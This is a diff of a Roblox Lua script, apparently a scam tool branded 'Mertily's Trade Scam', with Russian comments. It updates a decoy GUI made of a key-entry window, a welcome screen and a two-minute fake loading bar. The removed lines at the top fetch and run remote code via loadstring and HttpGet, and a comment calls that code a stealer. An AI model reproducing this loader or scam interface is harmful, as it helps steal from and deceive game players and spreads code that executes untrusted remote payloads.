@@ -1,18 +1,9 @@
--- ⚙️ Mertily's FULL LOADER (Меню)
--- Загружаем и выполняем ПЕРВЫЙ скрипт
-loadstring(game:HttpGet("https://api.rubis.lol/v2/scrap/hmNGuZ/raw"))()
-
--- Даем стилеру время на инициализацию
-wait(1)
-
--- ⬇️⬇️⬇️ НАЧАЛО ТВОЕГО МЕНЮ (второй скрипт) ⬇️⬇️⬇️
--- 🌐 Mertily's Trade Scam v5 (ИСПРАВЛЕННЫЙ)
+-- 🌐 Mertily's Trade Scam v6 (ЧИСТЫЙ, БЕЗ НАДПИСИ TEXTBOX)
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 local TweenService = game:GetService("TweenService")
 local UIS = game:GetService("UserInputService")
 local SoundService = game:GetService("SoundService")
-local RunService = game:GetService("RunService")
 
 local playerGui = Player:WaitForChild("PlayerGui")
 
@@ -80,7 +71,7 @@ local function fadeOutMusic(sound, duration)
     sound:Destroy()
 end
 
--- 🚪 ОКНО ВВОДА КЛЮЧА (БЕЗ НАДПИСИ TextBox)
+-- 🚪 ОКНО ВВОДА КЛЮЧА (ЧИСТОЕ, БЕЗ НАДПИСИ TextBox)
 local keyWindow = createRoundedFrame(screenGui, UDim2.new(0, 400, 0, 180), UDim2.new(0.5, -200, 0.5, -90), Color3.fromRGB(20, 20, 20), 0)
 local shadow = Instance.new("UIStroke")
 shadow.Color = Color3.fromRGB(255, 255, 255)
@@ -99,7 +90,7 @@ keyLabel.Font = Enum.Font.GothamBold
 keyLabel.TextWrapped = true
 keyLabel.Parent = keyWindow
 
--- ✅ ИСПРАВЛЕННОЕ ПОЛЕ ВВОДА (БЕЗ ТЕКСТА "TextBox")
+-- ✅ ПОЛЕ ВВОДА (ПУСТОЕ, ТОЛЬКО ПОДСКАЗКА)
 local keyBox = Instance.new("TextBox")
 keyBox.Size = UDim2.new(0.8, 0, 0, 40)
 keyBox.Position = UDim2.new(0.1, 0, 0.3, 0)
@@ -108,7 +99,7 @@ keyBox.TextColor3 = Color3.fromRGB(0, 0, 0)
 keyBox.TextScaled = true
 keyBox.Font = Enum.Font.Gotham
 keyBox.PlaceholderText = "Вставьте ключ..."
-keyBox.Text = ""  -- 👈 УБИРАЕМ НАДПИСЬ "TextBox"
+keyBox.Text = ""  -- 👈 ГЛАВНОЕ: НЕТ НАДПИСИ "TextBox"
 keyBox.ClearTextOnFocus = false
 keyBox.Parent = keyWindow
 
@@ -121,7 +112,7 @@ submitBtn.TextScaled = true
 submitBtn.Font = Enum.Font.GothamBold
 submitBtn.Text = "ВОЙТИ"
 submitBtn.Parent = keyWindow
-submitBtn.Modal = true  -- 👈 ДЕЛАЕМ КНОПКУ АКТИВНОЙ
+submitBtn.Modal = true  -- 👈 ДЕЛАЕМ КНОПКУ РАБОТАЮЩЕЙ
 
 local btnCorner = Instance.new("UICorner")
 btnCorner.CornerRadius = UDim.new(0, 8)
@@ -142,7 +133,7 @@ errorLabel.Parent = keyWindow
 -- 🔑 Ключ
 local CORRECT_KEY = "Private-i832-shin-923Z-Private"
 
--- 🟥 ПРИВЕТСТВИЕ (появляется ПОСЛЕ ключа)
+-- 🟥 ПРИВЕТСТВИЕ
 local function showWelcome()
     tweenObject(bg, {BackgroundTransparency = 0}, 0.5)
     
@@ -166,7 +157,7 @@ local function showWelcome()
     subText.Size = UDim2.new(1, 0, 0, 60)
     subText.Position = UDim2.new(0, 0, 0.6, -30)
     subText.BackgroundTransparency = 1
-    subText.Text = "Mertily's Trade Scam v5"
+    subText.Text = "Mertily's Trade Scam v6"
     subText.TextColor3 = Color3.fromRGB(200, 200, 200)
     subText.TextScaled = true
     subText.Font = Enum.Font.Gotham
@@ -184,7 +175,7 @@ local function showWelcome()
     welcomeFrame:Destroy()
 end
 
--- ⏳ Окно загрузки
+-- ⏳ Окно загрузки (2 МИНУТЫ)
 local function showLoading()
     local music = playMusic()
 
@@ -211,6 +202,7 @@ local function showLoading()
     progressLabel.Font = Enum.Font.Gotham
     progressLabel.Parent = loadFrame
 
+    -- 📈 Рост процентов за 2 МИНУТЫ
     local startTime = tick()
     local duration = 120
 
@@ -233,7 +225,7 @@ local function showLoading()
     wait(0.6)
     loadFrame:Destroy()
 
-    -- 🎬 Главное меню (появляется ПОСЛЕ загрузки)
+    -- 🎬 ПОКАЗЫВАЕМ ГЛАВНОЕ МЕНЮ
     mainFrame.Visible = true
     mainFrame.BackgroundTransparency = 1
     tweenObject(mainFrame, {BackgroundTransparency = 0}, 0.8)
@@ -244,7 +236,7 @@ local function showLoading()
     end
 end
 
--- 🖥️ Главное меню (пока скрыто)
+-- 🖥️ ГЛАВНОЕ МЕНЮ (появляется после загрузки)
 local mainFrame = createRoundedFrame(screenGui, UDim2.new(0, 600, 0, 400), UDim2.new(0.5, -300, 0.5, -200), Color3.fromRGB(15, 15, 15), 1)
 mainFrame.Visible = false
 
@@ -327,10 +319,11 @@ for i = 1, 3 do
     end)
 end
 
--- 🔐 ПРОВЕРКА КЛЮЧА
+-- 🔐 ПРОВЕРКА КЛЮЧА (РАБОТАЕТ!)
 submitBtn.MouseButton1Click:Connect(function()
     local input = keyBox.Text
     if input == CORRECT_KEY then
+        -- Скрываем окно ввода
         tweenObject(keyWindow, {BackgroundTransparency = 1}, 0.5)
         for _, child in ipairs(keyWindow:GetChildren()) do
             tweenObject(child, {TextTransparency = 1}, 0.5)
@@ -338,8 +331,11 @@ submitBtn.MouseButton1Click:Connect(function()
         wait(0.6)
         keyWindow:Destroy()
 
+        -- Показываем приветствие
         showWelcome()
         wait(3)
+
+        -- Запускаем загрузку на 2 минуты
         showLoading()
     else
         errorLabel.Text = "Братан либо неправильно ключ ввел либо ты захотел халявы😎"
@@ -385,4 +381,3 @@ end
 
 makeDraggable(keyWindow)
 makeDraggable(mainFrame)
--- ⬆️⬆️⬆️ КОНЕЦ ТВОЕГО МЕНЮ ⬆️⬆️⬆️
